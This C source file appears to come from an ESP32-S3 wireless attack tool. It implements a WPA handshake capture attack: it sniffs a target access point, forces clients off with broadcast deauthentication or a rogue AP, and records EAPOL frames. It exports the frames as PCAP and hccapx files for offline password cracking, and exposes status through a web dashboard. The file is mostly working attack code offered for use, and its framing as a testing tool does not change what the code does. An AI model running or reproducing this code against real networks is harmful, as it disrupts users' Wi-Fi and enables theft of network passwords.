/**
 * @file attack_handshake.c
 * @date 2026
 * @brief Implements handshake attacks with frame validation,
 *        mutex protection, timeout timer, and webserver API.
 *
 * Omega Solutions — ESP32-S3 Wireless Security Testing Tool
 *
 * Fixes applied (from code review):
 *   1. Mutex protection — prevents race conditions with webserver
 *   2. Timeout timer   — 60-second default, stops stale attacks
 *   3. Webserver API   — getter functions + JSON status for dashboard
 *   4. Thread-safe monitor task
 *   5. PCAP download support
 */

#include "attack_handshake.h"

#include <string.h>
#include <stdio.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "cJSON.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

/* ── OLED stubs (safe no-ops if OLED not present) ───────────── */

#define oled_log(line, row, fmt, ...) ESP_LOGI(TAG, fmt, ##__VA_ARGS__)
#ifndef OLED_HEAD
#define OLED_HEAD 0
#endif
#ifndef OLED_LINE1
#define OLED_LINE1 1
#endif

/* ── Logging tag ────────────────────────────────────────────── */

static const char *TAG = "main:attack_handshake";

/* ── Constants ──────────────────────────────────────────────── */

#define MIN_EAPOL_REQUIRED       4       /**< Full handshake = 4 EAPOL frames */
#define HANDSHAKE_TIMEOUT_SEC    60      /**< Default timeout: 60 seconds     */
#define MUTEX_TIMEOUT_MS         2000    /**< Mutex wait: 2 seconds           */

/* ── Mutable state (all guarded by handshake_mutex) ─────────── */

static SemaphoreHandle_t handshake_mutex         = NULL;
static attack_handshake_methods_t method         = -1;
static const wifi_ap_record_t *ap_record         = NULL;
static uint8_t captured_eapol_frames             = 0;
static bool is_running                           = false;
static bool event_handler_registered             = false;
static bool timeout_occurred                     = false;

/* ── Timer ──────────────────────────────────────────────────── */

static esp_timer_handle_t handshake_timeout_timer = NULL;
static esp_timer_handle_t handshake_timeout_orphan = NULL; /* deferred delete after timeout CB */
static bool handshake_in_timeout_cb = false;

/* ── Monitor task handle ────────────────────────────────────── */

static TaskHandle_t monitor_task_handle = NULL;

/* ══════════════════════════════════════════════════════════════
 *  Timeout callback
 * ══════════════════════════════════════════════════════════════ */

static void handshake_timeout_cb(void *arg)
{
    ESP_LOGW(TAG, "Handshake TIMEOUT after %d seconds!", HANDSHAKE_TIMEOUT_SEC);
    timeout_occurred = true;
    attack_update_status(FINISHED);
    handshake_in_timeout_cb = true;
    attack_handshake_stop();
    handshake_in_timeout_cb = false;
}

/* ══════════════════════════════════════════════════════════════
 *  EAPOL frame handler  (called from event loop — keep fast)
 * ══════════════════════════════════════════════════════════════ */

static void eapolkey_frame_handler(void *args, esp_event_base_t event_base,
                                   int32_t event_id, void *event_data)
{
    if (!is_running) return;

    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;

    /* ── Validate frame length ──────────────────────────────── */
    if (frame->rx_ctrl.sig_len <= 0 || frame->rx_ctrl.sig_len > 1500) {
        ESP_LOGW(TAG, "Malformed EAPOL frame dropped (len=%d).", frame->rx_ctrl.sig_len);
        return;
    }

    captured_eapol_frames++;

    /* ── Store captured data ─────────────────────────────────── */
    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len,
                                 frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame((data_frame_t *) frame->payload);

    ESP_LOGI(TAG, "EAPOL %d/%d captured.", captured_eapol_frames, MIN_EAPOL_REQUIRED);
    oled_log(OLED_LINE1, 2, "EAPOL: %d/%d", captured_eapol_frames, MIN_EAPOL_REQUIRED);
}

/* ══════════════════════════════════════════════════════════════
 *  Monitor task  — checks capture progress every second
 * ══════════════════════════════════════════════════════════════ */

void attack_handshake_monitor_task(void *arg)
{
    ESP_LOGI(TAG, "Monitor task started.");

    while (1) {
        /* ── Thread-safe snapshot of shared state ────────────── */
        bool running;
        bool captured;
        uint8_t count;

        if (handshake_mutex) {
            if (xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
                running  = is_running;
                captured = (captured_eapol_frames >= MIN_EAPOL_REQUIRED);
                count    = captured_eapol_frames;
                xSemaphoreGive(handshake_mutex);
            } else {
                /* Mutex timeout — keep looping */
                vTaskDelay(pdMS_TO_TICKS(500));
                continue;
            }
        } else {
            running  = is_running;
            captured = (captured_eapol_frames >= MIN_EAPOL_REQUIRED);
            count    = captured_eapol_frames;
        }

        /* ── Attack was stopped externally ───────────────────── */
        if (!running) break;

        /* ── Handshake complete! ──────────────────────────────── */
        if (captured) {
            ESP_LOGI(TAG, "Handshake SUCCESS (%d frames).", count);
            attack_update_status(FINISHED);
            attack_handshake_stop();
            break;
        }

        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    monitor_task_handle = NULL;
    vTaskDelete(NULL);
}

/* ══════════════════════════════════════════════════════════════
 *  START
 * ══════════════════════════════════════════════════════════════ */

void attack_handshake_start(attack_config_t *attack_config)
{
    /* ── Lazy-init mutex ─────────────────────────────────────── */
    if (handshake_mutex == NULL) {
        handshake_mutex = xSemaphoreCreateMutex();
    }

    if (xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(MUTEX_TIMEOUT_MS)) != pdTRUE) {
        ESP_LOGE(TAG, "Handshake start: mutex timeout — another op in progress?");
        return;
    }

    /* ── Validate inputs ─────────────────────────────────────── */
    if (attack_config == NULL || attack_config->target_count == 0 ||
        attack_config->ap_records[0] == NULL) {
        ESP_LOGE(TAG, "Handshake start failed: missing target AP record");
        xSemaphoreGive(handshake_mutex);
        return;
    }

    /* ── Stop previous run if active ─────────────────────────── */
    if (is_running) {
        ESP_LOGW(TAG, "Handshake already running, stopping previous run first.");
        xSemaphoreGive(handshake_mutex);
        attack_handshake_stop();                        /* stop takes its own lock */
        if (xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(MUTEX_TIMEOUT_MS)) != pdTRUE) {
            ESP_LOGE(TAG, "Handshake start: mutex timeout after stop.");
            return;
        }
    }

    ESP_LOGI(TAG, "Starting handshake attack on SSID: %s",
             (const char *)attack_config->ap_records[0]->ssid);

    /* ── Reset state ─────────────────────────────────────────── */
    captured_eapol_frames  = 0;
    method                 = attack_config->method;
    ap_record              = attack_config->ap_records[0];
    is_running             = true;
    timeout_occurred       = false;

    oled_log(OLED_HEAD, 3, "Handshake Active");
    oled_log(OLED_LINE1, 3, "Sniffing EAPOL...");

    /* ── Initialize serializers ──────────────────────────────── */
    pcap_serializer_init();
    hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));

    /* ── Start sniffer ───────────────────────────────────────── */
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);

    /* ── Start frame analyzer ────────────────────────────────── */
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);

    /* ── Register EAPOL event handler ────────────────────────── */
    esp_err_t err = esp_event_handler_register(
        FRAME_ANALYZER_EVENTS,
        DATA_FRAME_EVENT_EAPOLKEY_FRAME,
        &eapolkey_frame_handler, NULL);

    if (err != ESP_OK) {
        ESP_LOGW(TAG, "EAPOL event handler register failed: %s", esp_err_to_name(err));
        wifictl_sniffer_stop();
        frame_analyzer_capture_stop();
        is_running = false;
        ap_record  = NULL;
        method     = -1;
        xSemaphoreGive(handshake_mutex);
        return;
    }
    event_handler_registered = true;

    /* ── Start timeout timer ─────────────────────────────────── */
    if (handshake_timeout_orphan) {
        esp_timer_delete(handshake_timeout_orphan);
        handshake_timeout_orphan = NULL;
    }
    if (handshake_timeout_timer) {
        esp_timer_stop(handshake_timeout_timer);
        esp_timer_delete(handshake_timeout_timer);
        handshake_timeout_timer = NULL;
    }
    const esp_timer_create_args_t timer_args = {
        .callback  = handshake_timeout_cb,
        .name      = "hs_timeout"
    };
    esp_timer_create(&timer_args, &handshake_timeout_timer);
    esp_timer_start_once(handshake_timeout_timer,
                         (int64_t)HANDSHAKE_TIMEOUT_SEC * 1000000);

    /* ── Execute chosen attack method ────────────────────────── */
    switch (attack_config->method) {
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGD(TAG, "Method: BROADCAST deauth");
            attack_method_broadcast(ap_record, 5);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "Method: ROGUE AP");
            attack_method_rogueap(ap_record);
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGD(TAG, "Method: PASSIVE sniff");
            break;
        default:
            ESP_LOGW(TAG, "Unknown method! Fallback to PASSIVE");
            break;
    }

    /* ── Launch monitor task ─────────────────────────────────── */
    if (monitor_task_handle == NULL) {
        xTaskCreate(&attack_handshake_monitor_task, "hs_mon",
                    3072, NULL, 5, &monitor_task_handle);
    }

    xSemaphoreGive(handshake_mutex);
    ESP_LOGI(TAG, "Handshake attack started. Timeout: %d sec.", HANDSHAKE_TIMEOUT_SEC);
}

/* ══════════════════════════════════════════════════════════════
 *  STOP
 * ══════════════════════════════════════════════════════════════ */

void attack_handshake_stop(void)
{
    /* ── Lazy-init mutex ─────────────────────────────────────── */
    if (handshake_mutex == NULL) {
        handshake_mutex = xSemaphoreCreateMutex();
    }

    if (xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(MUTEX_TIMEOUT_MS)) != pdTRUE) {
        ESP_LOGE(TAG, "Handshake stop: mutex timeout!");
        return;
    }

    bool was_running = is_running;
    if (!was_running && !event_handler_registered) {
        xSemaphoreGive(handshake_mutex);
        return;
    }

    ESP_LOGI(TAG, "Stopping handshake attack...");

    /* ── Stop timeout timer first ────────────────────────────── */
    if (handshake_timeout_timer) {
        esp_timer_stop(handshake_timeout_timer);
        if (handshake_in_timeout_cb) {
            /* Cannot delete from own callback — defer */
            handshake_timeout_orphan = handshake_timeout_timer;
            handshake_timeout_timer = NULL;
        } else {
            esp_timer_delete(handshake_timeout_timer);
            handshake_timeout_timer = NULL;
        }
    }
    if (!handshake_in_timeout_cb && handshake_timeout_orphan) {
        esp_timer_delete(handshake_timeout_orphan);
        handshake_timeout_orphan = NULL;
    }

    /* ── Mark as stopped ─────────────────────────────────────── */
    is_running = false;

    /* ── Stop attack method ──────────────────────────────────── */
    if (was_running) {
        switch (method) {
            case ATTACK_HANDSHAKE_METHOD_BROADCAST:
                attack_method_broadcast_stop();
                break;
            case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
                wifictl_mgmt_ap_start();
                wifictl_restore_ap_mac();
                break;
            case ATTACK_HANDSHAKE_METHOD_PASSIVE:
                break;
            default:
                ESP_LOGE(TAG, "Unknown method! May not be stopped properly.");
                break;
        }
        wifictl_sniffer_stop();
        frame_analyzer_capture_stop();
    }

    /* ── Unregister EAPOL event handler ──────────────────────── */
    if (event_handler_registered) {
        esp_err_t err = esp_event_handler_unregister(
            FRAME_ANALYZER_EVENTS,
            DATA_FRAME_EVENT_EAPOLKEY_FRAME,
            &eapolkey_frame_handler);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "EAPOL handler unregister failed: %s", esp_err_to_name(err));
        } else {
            event_handler_registered = false;
        }
    }

    /* ── Final status ────────────────────────────────────────── */
    if (captured_eapol_frames >= MIN_EAPOL_REQUIRED) {
        ESP_LOGI(TAG, "Handshake SUCCESS! %d frames captured.", captured_eapol_frames);
        oled_log(OLED_HEAD, 4, "HANDSHAKE SUCCESS!");
        oled_log(OLED_LINE1, 4, "Saved PCAP");
    } else if (timeout_occurred) {
        ESP_LOGW(TAG, "Handshake TIMEOUT! Only %d frame(s) captured.", captured_eapol_frames);
        oled_log(OLED_HEAD, 4, "HANDSHAKE TIMEOUT");
        oled_log(OLED_LINE1, 4, "%d/%d frames", captured_eapol_frames, MIN_EAPOL_REQUIRED);
    } else {
        ESP_LOGW(TAG, "Handshake ABORTED manually. %d frame(s) captured.", captured_eapol_frames);
        oled_log(OLED_HEAD, 4, "HANDSHAKE ABORTED");
        oled_log(OLED_LINE1, 4, "Incomplete Capture");
    }

    /* ── Clear pointers (keep captured_eapol_frames for web API) */
    ap_record = NULL;
    method    = -1;

    xSemaphoreGive(handshake_mutex);
    ESP_LOGD(TAG, "Handshake attack stopped cleanly.");
}

/* ══════════════════════════════════════════════════════════════
 *  WEBSERVER / DASHBOARD  API
 * ══════════════════════════════════════════════════════════════ */

bool attack_handshake_is_running(void)
{
    bool running = false;
    if (handshake_mutex && xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        running = is_running;
        xSemaphoreGive(handshake_mutex);
    } else {
        running = is_running;   /* best-effort without mutex */
    }
    return running;
}

bool attack_handshake_has_capture(void)
{
    bool captured = false;
    if (handshake_mutex && xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        captured = (captured_eapol_frames >= MIN_EAPOL_REQUIRED);
        xSemaphoreGive(handshake_mutex);
    } else {
        captured = (captured_eapol_frames >= MIN_EAPOL_REQUIRED);
    }
    return captured;
}

uint8_t attack_handshake_get_eapol_count(void)
{
    uint8_t count = 0;
    if (handshake_mutex && xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        count = captured_eapol_frames;
        xSemaphoreGive(handshake_mutex);
    } else {
        count = captured_eapol_frames;
    }
    return count;
}

bool attack_handshake_was_timeout(void)
{
    bool tmo = false;
    if (handshake_mutex && xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        tmo = timeout_occurred;
        xSemaphoreGive(handshake_mutex);
    } else {
        tmo = timeout_occurred;
    }
    return tmo;
}

const char *attack_handshake_get_status_str(void)
{
    if (handshake_mutex && xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        const char *s;
        if (is_running) {
            s = "running";
        } else if (timeout_occurred && captured_eapol_frames < MIN_EAPOL_REQUIRED) {
            s = "timeout";
        } else if (captured_eapol_frames >= MIN_EAPOL_REQUIRED) {
            s = "captured";
        } else if (captured_eapol_frames > 0) {
            s = "partial";
        } else {
            s = "idle";
        }
        xSemaphoreGive(handshake_mutex);
        return s;
    }
    /* Best-effort fallback */
    if (is_running) return "running";
    if (timeout_occurred) return "timeout";
    if (captured_eapol_frames >= MIN_EAPOL_REQUIRED) return "captured";
    if (captured_eapol_frames > 0) return "partial";
    return "idle";
}

const char *attack_handshake_get_ssid(void)
{
    const char *ssid = NULL;
    if (handshake_mutex && xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        ssid = (ap_record != NULL) ? (const char *)ap_record->ssid : NULL;
        xSemaphoreGive(handshake_mutex);
    } else {
        ssid = (ap_record != NULL) ? (const char *)ap_record->ssid : NULL;
    }
    return ssid ? ssid : "\xe2\x80\x94";   /* "—" em-dash if no target */
}

void attack_handshake_get_bssid(char *buf, size_t buf_len)
{
    if (buf == NULL || buf_len < 18) {
        if (buf) buf[0] = '\0';
        return;
    }
    if (handshake_mutex && xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        if (ap_record != NULL) {
            snprintf(buf, buf_len, "%02x:%02x:%02x:%02x:%02x:%02x",
                     ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                     ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
        } else {
            snprintf(buf, buf_len, "\xe2\x80\x94");
        }
        xSemaphoreGive(handshake_mutex);
    } else {
        if (ap_record != NULL) {
            snprintf(buf, buf_len, "%02x:%02x:%02x:%02x:%02x:%02x",
                     ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                     ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
        } else {
            snprintf(buf, buf_len, "\xe2\x80\x94");
        }
    }
}

uint8_t attack_handshake_get_channel(void)
{
    uint8_t ch = 0;
    if (handshake_mutex && xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        ch = (ap_record != NULL) ? ap_record->primary : 0;
        xSemaphoreGive(handshake_mutex);
    } else {
        ch = (ap_record != NULL) ? ap_record->primary : 0;
    }
    return ch;
}

cJSON *attack_handshake_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return NULL;

    if (handshake_mutex && xSemaphoreTake(handshake_mutex, pdMS_TO_TICKS(300)) == pdTRUE) {
        /* ── Running state ────────────────────────────────────── */
        cJSON_AddBoolToObject(root, "running", is_running);

        /* ── Capture progress ─────────────────────────────────── */
        cJSON_AddNumberToObject(root, "eapol_count", captured_eapol_frames);
        cJSON_AddNumberToObject(root, "eapol_required", MIN_EAPOL_REQUIRED);

        /* ── Status string ────────────────────────────────────── */
        const char *s;
        if (is_running) {
            s = "running";
        } else if (timeout_occurred && captured_eapol_frames < MIN_EAPOL_REQUIRED) {
            s = "timeout";
        } else if (captured_eapol_frames >= MIN_EAPOL_REQUIRED) {
            s = "captured";
        } else if (captured_eapol_frames > 0) {
            s = "partial";
        } else {
            s = "idle";
        }
        cJSON_AddStringToObject(root, "status", s);

        /* ── Timeout flag ─────────────────────────────────────── */
        cJSON_AddBoolToObject(root, "timeout", timeout_occurred);

        /* ── Target AP info ───────────────────────────────────── */
        if (ap_record != NULL) {
            char bssid_str[18];
            snprintf(bssid_str, sizeof(bssid_str),
                     "%02x:%02x:%02x:%02x:%02x:%02x",
                     ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                     ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
            cJSON_AddStringToObject(root, "bssid", bssid_str);
            cJSON_AddStringToObject(root, "ssid", (const char *)ap_record->ssid);
            cJSON_AddNumberToObject(root, "channel", ap_record->primary);
        } else {
            cJSON_AddStringToObject(root, "bssid", "");
            cJSON_AddStringToObject(root, "ssid", "");
            cJSON_AddNumberToObject(root, "channel", 0);
        }

        xSemaphoreGive(handshake_mutex);
    } else {
        /* ── Mutex failed — return minimal info ───────────────── */
        cJSON_AddBoolToObject(root, "running", is_running);
        cJSON_AddStringToObject(root, "status", "unknown");
        cJSON_AddNumberToObject(root, "eapol_count", 0);
    }

    return root;
}

size_t attack_handshake_get_pcap_size(void)
{
    return (size_t)pcap_serializer_get_size();
}

const uint8_t *attack_handshake_get_pcap_data(void)
{
    return pcap_serializer_get_buffer();
}